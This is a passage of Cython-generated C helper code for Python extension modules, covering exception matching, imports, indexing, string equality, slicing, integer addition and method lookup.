            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        }
        else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        }
        else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject* err, PyObject* exc_type1, PyObject* exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif
static PyObject* __Pyx_Import(PyObject* name, PyObject* from_list, int level) {
    PyObject* empty_list = 0;
    PyObject* module = 0;
    PyObject* global_dict = 0;
    PyObject* empty_dict = 0;
    PyObject* list;
#if PY_MAJOR_VERSION < 3
    PyObject* py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
#endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
#if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
#endif
        if (!module) {
#if PY_MAJOR_VERSION < 3
            PyObject* py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject*)NULL);
            Py_DECREF(py_level);
#else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
#endif
        }
    }
bad:
#if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
#endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}
static PyObject* __Pyx_GetItemInt_Generic(PyObject* o, PyObject* j) {
    PyObject* r;
    if (!j) return NULL;
    r = PyObject_GetItem(o, j);
    Py_DECREF(j);
    return r;
}
static CYTHON_INLINE PyObject* __Pyx_GetItemInt_List_Fast(PyObject* o, Py_ssize_t i,
    CYTHON_NCP_UNUSED int wraparound,
    CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyList_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {
        PyObject* r = PyList_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject* __Pyx_GetItemInt_Tuple_Fast(PyObject* o, Py_ssize_t i,
    CYTHON_NCP_UNUSED int wraparound,
    CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyTuple_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {
        PyObject* r = PyTuple_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject* __Pyx_GetItemInt_Fast(PyObject* o, Py_ssize_t i, int is_list,
    CYTHON_NCP_UNUSED int wraparound,
    CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS
    if (is_list || PyList_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);
        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {
            PyObject* r = PyList_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else if (PyTuple_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);
        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {
            PyObject* r = PyTuple_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else {
        PySequenceMethods* m = Py_TYPE(o)->tp_as_sequence;
        if (likely(m && m->sq_item)) {
            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {
                Py_ssize_t l = m->sq_length(o);
                if (likely(l >= 0)) {
                    i += l;
                }
                else {
                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                        return NULL;
                    PyErr_Clear();
                }
            }
            return m->sq_item(o, i);
        }
    }
#else
    if (is_list || PySequence_Check(o)) {
        return PySequence_GetItem(o, i);
    }
#endif
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
}
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
    if (s1 == s2) {
        return (equals == Py_EQ);
    }
    else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {
        const char* ps1, * ps2;
        Py_ssize_t length = PyBytes_GET_SIZE(s1);
        if (length != PyBytes_GET_SIZE(s2))
            return (equals == Py_NE);
        ps1 = PyBytes_AS_STRING(s1);
        ps2 = PyBytes_AS_STRING(s2);
        if (ps1[0] != ps2[0]) {
            return (equals == Py_NE);
        }
        else if (length == 1) {
            return (equals == Py_EQ);
        }
        else {
            int result;
#if CYTHON_USE_UNICODE_INTERNALS && (PY_VERSION_HEX < 0x030B0000)
            Py_hash_t hash1, hash2;
            hash1 = ((PyBytesObject*)s1)->ob_shash;
            hash2 = ((PyBytesObject*)s2)->ob_shash;
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                return (equals == Py_NE);
            }
#endif
            result = memcmp(ps1, ps2, (size_t)length);
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    }
    else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {
        return (equals == Py_NE);
    }
    else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {
        return (equals == Py_NE);
    }
    else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
#endif
}
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
#if PY_MAJOR_VERSION < 3
    PyObject* owned_ref = NULL;
#endif
    int s1_is_unicode, s2_is_unicode;
    if (s1 == s2) {
        goto return_eq;
    }
    s1_is_unicode = PyUnicode_CheckExact(s1);
    s2_is_unicode = PyUnicode_CheckExact(s2);
#if PY_MAJOR_VERSION < 3
    if ((s1_is_unicode & (!s2_is_unicode)) && PyString_CheckExact(s2)) {
        owned_ref = PyUnicode_FromObject(s2);
        if (unlikely(!owned_ref))
            return -1;
        s2 = owned_ref;
        s2_is_unicode = 1;
    }
    else if ((s2_is_unicode & (!s1_is_unicode)) && PyString_CheckExact(s1)) {
        owned_ref = PyUnicode_FromObject(s1);
        if (unlikely(!owned_ref))
            return -1;
        s1 = owned_ref;
        s1_is_unicode = 1;
    }
    else if (((!s2_is_unicode) & (!s1_is_unicode))) {
        return __Pyx_PyBytes_Equals(s1, s2, equals);
    }
#endif
    if (s1_is_unicode & s2_is_unicode) {
        Py_ssize_t length;
        int kind;
        void* data1, * data2;
        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))
            return -1;
        length = __Pyx_PyUnicode_GET_LENGTH(s1);
        if (length != __Pyx_PyUnicode_GET_LENGTH(s2)) {
            goto return_ne;
        }
#if CYTHON_USE_UNICODE_INTERNALS
        {
            Py_hash_t hash1, hash2;
#if CYTHON_PEP393_ENABLED
            hash1 = ((PyASCIIObject*)s1)->hash;
            hash2 = ((PyASCIIObject*)s2)->hash;
#else
            hash1 = ((PyUnicodeObject*)s1)->hash;
            hash2 = ((PyUnicodeObject*)s2)->hash;
#endif
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                goto return_ne;
            }
        }
#endif
        kind = __Pyx_PyUnicode_KIND(s1);
        if (kind != __Pyx_PyUnicode_KIND(s2)) {
            goto return_ne;
        }
        data1 = __Pyx_PyUnicode_DATA(s1);
        data2 = __Pyx_PyUnicode_DATA(s2);
        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {
            goto return_ne;
        }
        else if (length == 1) {
            goto return_eq;
        }
        else {
            int result = memcmp(data1, data2, (size_t)(length * kind));
#if PY_MAJOR_VERSION < 3
            Py_XDECREF(owned_ref);
#endif
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    }
    else if ((s1 == Py_None) & s2_is_unicode) {
        goto return_ne;
    }
    else if ((s2 == Py_None) & s1_is_unicode) {
        goto return_ne;
    }
    else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
#if PY_MAJOR_VERSION < 3
        Py_XDECREF(owned_ref);
#endif
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
return_eq:
#if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
#endif
    return (equals == Py_EQ);
return_ne:
#if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
#endif
    return (equals == Py_NE);
#endif
}
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState* tstate, PyObject** type, PyObject** value, PyObject** tb) {
    PyObject* tmp_type, * tmp_value, * tmp_tb;
#if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem* exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = *type;
    exc_info->exc_value = *value;
    exc_info->exc_traceback = *tb;
#else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = *type;
    tstate->exc_value = *value;
    tstate->exc_traceback = *tb;
#endif
    * type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject** type, PyObject** value, PyObject** tb) {
    PyObject* tmp_type, * tmp_value, * tmp_tb;
    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);
    PyErr_SetExcInfo(*type, *value, *tb);
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#endif
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,
    Py_ssize_t cstart, Py_ssize_t cstop,
    PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,
    int has_cstart, int has_cstop, CYTHON_UNUSED int wraparound) {
#if CYTHON_USE_TYPE_SLOTS
    PyMappingMethods* mp;
#if PY_MAJOR_VERSION < 3
    PySequenceMethods* ms = Py_TYPE(obj)->tp_as_sequence;
    if (likely(ms && ms->sq_slice)) {
        if (!has_cstart) {
            if (_py_start && (*_py_start != Py_None)) {
                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);
                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            }
            else
                cstart = 0;
        }
        if (!has_cstop) {
            if (_py_stop && (*_py_stop != Py_None)) {
                cstop = __Pyx_PyIndex_AsSsize_t(*_py_stop);
                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            }
            else
                cstop = PY_SSIZE_T_MAX;
        }
        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {
            Py_ssize_t l = ms->sq_length(obj);
            if (likely(l >= 0)) {
                if (cstop < 0) {
                    cstop += l;
                    if (cstop < 0) cstop = 0;
                }
                if (cstart < 0) {
                    cstart += l;
                    if (cstart < 0) cstart = 0;
                }
            }
            else {
                if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                    goto bad;
                PyErr_Clear();
            }
        }
        return ms->sq_slice(obj, cstart, cstop);
    }
#endif
    mp = Py_TYPE(obj)->tp_as_mapping;
    if (likely(mp && mp->mp_subscript))
#endif
    {
        PyObject* result;
        PyObject* py_slice, * py_start, * py_stop;
        if (_py_slice) {
            py_slice = *_py_slice;
        }
        else {
            PyObject* owned_start = NULL;
            PyObject* owned_stop = NULL;
            if (_py_start) {
                py_start = *_py_start;
            }
            else {
                if (has_cstart) {
                    owned_start = py_start = PyInt_FromSsize_t(cstart);
                    if (unlikely(!py_start)) goto bad;
                }
                else
                    py_start = Py_None;
            }
            if (_py_stop) {
                py_stop = *_py_stop;
            }
            else {
                if (has_cstop) {
                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);
                    if (unlikely(!py_stop)) {
                        Py_XDECREF(owned_start);
                        goto bad;
                    }
                }
                else
                    py_stop = Py_None;
            }
            py_slice = PySlice_New(py_start, py_stop, Py_None);
            Py_XDECREF(owned_start);
            Py_XDECREF(owned_stop);
            if (unlikely(!py_slice)) goto bad;
        }
#if CYTHON_USE_TYPE_SLOTS
        result = mp->mp_subscript(obj, py_slice);
#else
        result = PyObject_GetItem(obj, py_slice);
#endif
        if (!_py_slice) {
            Py_DECREF(py_slice);
        }
        return result;
    }
    PyErr_Format(PyExc_TypeError,
        "'%.200s' object is unsliceable", Py_TYPE(obj)->tp_name);
bad:
    return NULL;
}
static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected) {
    PyErr_Format(PyExc_ValueError,
        "too many values to unpack (expected %" CYTHON_FORMAT_SSIZE_T "d)", expected);
}
static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index) {
    PyErr_Format(PyExc_ValueError,
        "need more than %" CYTHON_FORMAT_SSIZE_T "d value%.1s to unpack",
        index, (index == 1) ? "" : "s");
}
static CYTHON_INLINE int __Pyx_IterFinish(void) {
#if CYTHON_FAST_THREAD_STATE
    PyThreadState* tstate = __Pyx_PyThreadState_Current;
    PyObject* exc_type = tstate->curexc_type;
    if (unlikely(exc_type)) {
        if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) {
            PyObject* exc_value, * exc_tb;
            exc_value = tstate->curexc_value;
            exc_tb = tstate->curexc_traceback;
            tstate->curexc_type = 0;
            tstate->curexc_value = 0;
            tstate->curexc_traceback = 0;
            Py_DECREF(exc_type);
            Py_XDECREF(exc_value);
            Py_XDECREF(exc_tb);
            return 0;
        }
        else {
            return -1;
        }
    }
    return 0;
#else
    if (unlikely(PyErr_Occurred())) {
        if (likely(PyErr_ExceptionMatches(PyExc_StopIteration))) {
            PyErr_Clear();
            return 0;
        }
        else {
            return -1;
        }
    }
    return 0;
#endif
}
static int __Pyx_IternextUnpackEndCheck(PyObject* retval, Py_ssize_t expected) {
    if (unlikely(retval)) {
        Py_DECREF(retval);
        __Pyx_RaiseTooManyValuesError(expected);
        return -1;
    }
    else {
        return __Pyx_IterFinish();
    }
    return 0;
}
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject* op1, PyObject* op2, CYTHON_UNUSED long intval, int inplace, int zerodivision_check) {
    (void)inplace;
    (void)zerodivision_check;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long x;
        long a = PyInt_AS_LONG(op1);
        x = (long)((unsigned long)a + b);
        if (likely((x ^ a) >= 0 || (x ^ b) >= 0))
            return PyInt_FromLong(x);
        return PyLong_Type.tp_as_number->nb_add(op1, op2);
    }
#endif
#if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        const long b = intval;
        long a, x;
#ifdef HAVE_LONG_LONG
        const PY_LONG_LONG llb = intval;
        PY_LONG_LONG lla, llx;
#endif
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        const Py_ssize_t size = Py_SIZE(op1);
        if (likely(__Pyx_sst_abs(size) <= 1)) {
            a = likely(size) ? digits[0] : 0;
            if (size == -1) a = -a;
        }
        else {
            switch (size) {
            case -2:
                if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                    a = -(long)(((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                    break;
#ifdef HAVE_LONG_LONG
                }
                else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                    lla = -(PY_LONG_LONG)(((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                    goto long_long;
#endif
                }
                CYTHON_FALLTHROUGH;
            case 2:
                if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                    a = (long)(((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                    break;
#ifdef HAVE_LONG_LONG
                }
                else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                    lla = (PY_LONG_LONG)(((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                    goto long_long;
#endif
                }
                CYTHON_FALLTHROUGH;
            case -3:
                if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                    a = -(long)(((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                    break;
#ifdef HAVE_LONG_LONG
                }
                else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                    lla = -(PY_LONG_LONG)(((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                    goto long_long;
#endif
                }
                CYTHON_FALLTHROUGH;
            case 3:
                if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                    a = (long)(((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                    break;
#ifdef HAVE_LONG_LONG
                }
                else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                    lla = (PY_LONG_LONG)(((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                    goto long_long;
#endif
                }
                CYTHON_FALLTHROUGH;
            case -4:
                if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                    a = -(long)(((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                    break;
#ifdef HAVE_LONG_LONG
                }
                else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                    lla = -(PY_LONG_LONG)(((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                    goto long_long;
#endif
                }
                CYTHON_FALLTHROUGH;
            case 4:
                if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                    a = (long)(((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                    break;
#ifdef HAVE_LONG_LONG
                }
                else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                    lla = (PY_LONG_LONG)(((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                    goto long_long;
#endif
                }
                CYTHON_FALLTHROUGH;
            default: return PyLong_Type.tp_as_number->nb_add(op1, op2);
            }
        }
        x = a + b;
        return PyLong_FromLong(x);
#ifdef HAVE_LONG_LONG
        long_long :
        llx = lla + llb;
        return PyLong_FromLongLong(llx);
#endif


    }
#endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
        double result;
        PyFPE_START_PROTECT("add", return NULL)
            result = ((double)a) + (double)b;
        PyFPE_END_PROTECT(result)
            return PyFloat_FromDouble(result);
    }
    return (inplace ? PyNumber_InPlaceAdd : PyNumber_Add)(op1, op2);
}
#endif
#if CYTHON_USE_TYPE_SLOTS
static PyObject* __Pyx_PyObject_GetIndex(PyObject* obj, PyObject* index) {
    PyObject* runerr;
    Py_ssize_t key_value;
    PySequenceMethods* m = Py_TYPE(obj)->tp_as_sequence;
    if (unlikely(!(m && m->sq_item))) {
        PyErr_Format(PyExc_TypeError, "'%.200s' object is not subscriptable", Py_TYPE(obj)->tp_name);
        return NULL;
    }
    key_value = __Pyx_PyIndex_AsSsize_t(index);
    if (likely(key_value != -1 || !(runerr = PyErr_Occurred()))) {
        return __Pyx_GetItemInt_Fast(obj, key_value, 0, 1, 1);
    }
    if (PyErr_GivenExceptionMatches(runerr, PyExc_OverflowError)) {
        PyErr_Clear();
        PyErr_Format(PyExc_IndexError, "cannot fit '%.200s' into an index-sized integer", Py_TYPE(index)->tp_name);
    }
    return NULL;
}
static PyObject* __Pyx_PyObject_GetItem(PyObject* obj, PyObject* key) {
    PyMappingMethods* m = Py_TYPE(obj)->tp_as_mapping;
    if (likely(m && m->mp_subscript)) {
        return m->mp_subscript(obj, key);
    }
    return __Pyx_PyObject_GetIndex(obj, key);
}
#endif
#if CYTHON_FAST_THREAD_STATE
static int __Pyx_PyErr_ExceptionMatchesTuple(PyObject* exc_type, PyObject* tuple) {
    Py_ssize_t i, n;
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i = 0; i < n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i = 0; i < n; i++) {
        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {
    PyObject* exc_type = tstate->curexc_type;
    if (exc_type == err) return 1;
    if (unlikely(!exc_type)) return 0;
    if (unlikely(PyTuple_Check(err)))
        return __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);
    return __Pyx_PyErr_GivenExceptionMatches(exc_type, err);
}
#endif
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
    CYTHON_UNUSED Py_UCS4 max_char) {
#if CYTHON_USE_UNICODE_INTERNALS && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    PyObject* result_uval;
    int result_ukind;
    Py_ssize_t i, char_pos;
    void* result_udata;
#if CYTHON_PEP393_ENABLED
    result_uval = PyUnicode_New(result_ulength, max_char);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = (max_char <= 255) ? PyUnicode_1BYTE_KIND : (max_char <= 65535) ? PyUnicode_2BYTE_KIND : PyUnicode_4BYTE_KIND;
    result_udata = PyUnicode_DATA(result_uval);
#else
    result_uval = PyUnicode_FromUnicode(NULL, result_ulength);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = sizeof(Py_UNICODE);
    result_udata = PyUnicode_AS_UNICODE(result_uval);
#endif
    char_pos = 0;
    for (i = 0; i < value_count; i++) {
        int ukind;
        Py_ssize_t ulength;
        void* udata;
        PyObject* uval = PyTuple_GET_ITEM(value_tuple, i);
        if (unlikely(__Pyx_PyUnicode_READY(uval)))
            goto bad;
        ulength = __Pyx_PyUnicode_GET_LENGTH(uval);
        if (unlikely(!ulength))
            continue;
        if (unlikely(char_pos + ulength < 0))
            goto overflow;
        ukind = __Pyx_PyUnicode_KIND(uval);
        udata = __Pyx_PyUnicode_DATA(uval);
        if (!CYTHON_PEP393_ENABLED || ukind == result_ukind) {
            memcpy((char*)result_udata + char_pos * result_ukind, udata, (size_t)(ulength * result_ukind));
        }
        else {
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030300F0 || defined(_PyUnicode_FastCopyCharacters)
            _PyUnicode_FastCopyCharacters(result_uval, char_pos, uval, 0, ulength);
#else
            Py_ssize_t j;
            for (j = 0; j < ulength; j++) {
                Py_UCS4 uchar = __Pyx_PyUnicode_READ(ukind, udata, j);
                __Pyx_PyUnicode_WRITE(result_ukind, result_udata, char_pos + j, uchar);
            }
#endif
        }
        char_pos += ulength;
    }
    return result_uval;
overflow:
    PyErr_SetString(PyExc_OverflowError, "join() result is too long for a Python string");
bad:
    Py_DECREF(result_uval);
    return NULL;
#else
    result_ulength++;
    value_count++;
    return PyUnicode_Join(__pyx_empty_unicode, value_tuple);
#endif
}
static int __Pyx_PyObject_GetMethod(PyObject* obj, PyObject* name, PyObject** method) {
    PyObject* attr;
#if CYTHON_UNPACK_METHODS && CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_PYTYPE_LOOKUP
    PyTypeObject* tp = Py_TYPE(obj);
    PyObject* descr;
    descrgetfunc f = NULL;
    PyObject** dictptr, * dict;
    int meth_found = 0;
    assert(*method == NULL);
    if (unlikely(tp->tp_getattro != PyObject_GenericGetAttr)) {
        attr = __Pyx_PyObject_GetAttrStr(obj, name);
        goto try_unpack;
    }
    if (unlikely(tp->tp_dict == NULL) && unlikely(PyType_Ready(tp) < 0)) {
        return 0;
    }
    descr = _PyType_Lookup(tp, name);
    if (likely(descr != NULL)) {
        Py_INCREF(descr);
#if PY_MAJOR_VERSION >= 3
#ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type) || __Pyx_CyFunction_Check(descr)))
#else
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type)))
#endif
#else
#ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || __Pyx_CyFunction_Check(descr)))
#else
        if (likely(PyFunction_Check(descr)))
#endif
#endif
        {
            meth_found = 1;
        }
        else {
            f = Py_TYPE(descr)->tp_descr_get;
            if (f != NULL && PyDescr_IsData(descr)) {
                attr = f(descr, obj, (PyObject*)Py_TYPE(obj));
                Py_DECREF(descr);
                goto try_unpack;
            }
        }
    }
    dictptr = _PyObject_GetDictPtr(obj);
    if (dictptr != NULL && (dict = *dictptr) != NULL) {
        Py_INCREF(dict);
        attr = __Pyx_PyDict_GetItemStr(dict, name);
        if (attr != NULL) {
            Py_INCREF(attr);
            Py_DECREF(dict);
            Py_XDECREF(descr);
            goto try_unpack;
        }
        Py_DECREF(dict);
    }
    if (meth_found) {
        *method = descr;
        return 1;
    }
    if (f != NULL) {
        attr = f(descr, obj, (PyObject*)Py_TYPE(obj));
        Py_DECREF(descr);
        goto try_unpack;
    }
    if (descr != NULL) {
        *method = descr;
        return 0;
    }
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
        "'%.50s' object has no attribute '%U'",
        tp->tp_name, name);
#else
        "'%.50s' object has no attribute '%.400s'",
        tp->tp_name, PyString_AS_STRING(name));
#endif
    return 0;
#else
    attr = __Pyx_PyObject_GetAttrStr(obj, name);
    goto try_unpack;
#endif
try_unpack:
#if CYTHON_UNPACK_METHODS
    if (likely(attr) && PyMethod_Check(attr) && likely(PyMethod_GET_SELF(attr) == obj)) {
        PyObject* function = PyMethod_GET_FUNCTION(attr);
        Py_INCREF(function);
        Py_DECREF(attr);
        *method = function;
        return 1;
    }
#endif
    * method = attr;
    return 0;
}
static PyObject* __Pyx__PyObject_CallMethod1(PyObject* method, PyObject* arg) {
    PyObject* result = __Pyx_PyObject_CallOneArg(method, arg);
    Py_DECREF(method);
    return result;
}
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg) {
    PyObject* method = NULL, * result;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_Call2Args(method, obj, arg);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) return NULL;
    return __Pyx__PyObject_CallMethod1(method, arg);
}
